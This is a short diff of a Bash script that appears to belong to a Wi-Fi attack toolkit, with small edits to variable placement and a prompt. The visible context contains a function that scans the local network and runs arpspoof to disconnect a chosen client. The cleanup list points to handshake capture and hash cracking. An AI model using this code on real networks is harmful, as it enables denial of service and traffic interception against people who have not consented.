@@ -10,7 +10,7 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 cleancolor="echo -e "${endColour}""
-tarnomon="$(echo "$tar" | sed 's/mon$//')"
+
 
 filestrash() {
 	files=(dnsmasq.conf hostapd.conf Capture.pcapng hash.hc22000 iface Handshake* datos-privados.txt TsharkCap)
@@ -463,7 +463,7 @@ modeagain () {
 	tput cnorm
 	modeverification
 }
-
+tarnomon="$(echo "$tar" | sed 's/mon$//')"
 dosforclient () {
 
 	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client... Wait a moment"
@@ -471,7 +471,7 @@ dosforclient () {
 	sudo arp-scan -I $tarnomon --localnet 
 	sleep 1
 	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
-	echo -ne "${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
+	echo -ne "\n${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
 	tput civis
 	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\+\)$/1/g')
 	xterm -hold -e "sudo arpspoof -i "$tarnomon" -t "$clientattackdos" "$ipnew"" &
